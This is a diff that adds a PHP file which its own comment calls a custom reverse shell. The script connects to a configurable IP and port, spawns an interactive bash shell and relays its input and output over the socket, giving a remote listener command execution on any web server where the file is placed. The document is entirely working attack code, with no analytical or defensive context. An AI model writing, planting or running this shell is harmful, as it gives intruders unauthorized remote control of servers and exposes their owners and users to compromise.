@@ -1,0 +1,42 @@
+<?php
+// Custom PHP Reverse Shell
+set_time_limit(0);
+$ip = '127.0.0.1'; // CHANGE THIS
+$port = 1234; // CHANGE THIS
+$shell = '/bin/bash -i';
+$chunk_size = 1400;
+
+// Establish connection
+$sock = fsockopen($ip, $port);
+if (!$sock) exit();
+
+// Spawn shell
+$descriptors = [
+    0 => ['pipe', 'r'],
+    1 => ['pipe', 'w'],
+    2 => ['pipe', 'w']
+];
+$process = proc_open($shell, $descriptors, $pipes);
+if (!is_resource($process)) exit();
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+while (1) {
+    if (feof($sock) || feof($pipes[1])) break;
+    $read = [$sock, $pipes[1], $pipes[2]];
+    stream_select($read, $write, $error, null);
+    
+    if (in_array($sock, $read)) fwrite($pipes[0], fread($sock, $chunk_size));
+    if (in_array($pipes[1], $read)) fwrite($sock, fread($pipes[1], $chunk_size));
+    if (in_array($pipes[2], $read)) fwrite($sock, fread($pipes[2], $chunk_size));
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+?>
